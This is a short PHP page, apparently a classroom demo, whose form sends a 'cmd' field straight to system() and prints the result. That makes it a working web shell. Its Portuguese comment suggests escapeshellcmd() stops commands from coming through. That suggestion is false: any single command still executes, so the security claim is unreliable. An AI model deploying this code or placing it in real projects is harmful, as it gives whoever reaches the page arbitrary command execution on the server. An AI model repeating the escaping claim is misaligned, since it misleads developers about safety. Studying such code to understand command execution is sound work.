<?php 

if($_SERVER["REQUEST_METHOD"] === 'POST') {
	// Evitar que venha comandos
	$cmd = escapeshellcmd($_POST["cmd"]);
	// desse jeito vem comandos
	// $cmd = $_POST["cmd"];

	echo "<pre>";
	$comando = system($cmd, $retorno);
	echo "</pre>";
}

?>
<form method="post">

	<input type="text" name="cmd">
	<button type="submit">Enviar</button>
</form>